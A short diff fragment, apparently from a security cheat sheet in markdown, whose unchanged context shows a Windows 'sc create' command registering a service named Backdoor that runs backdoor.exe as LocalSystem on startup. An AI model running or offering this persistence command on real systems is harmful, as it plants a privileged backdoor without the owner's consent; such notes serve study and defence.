@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:29.727924+00:00'
 ```bash
 sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
 ```
+
+
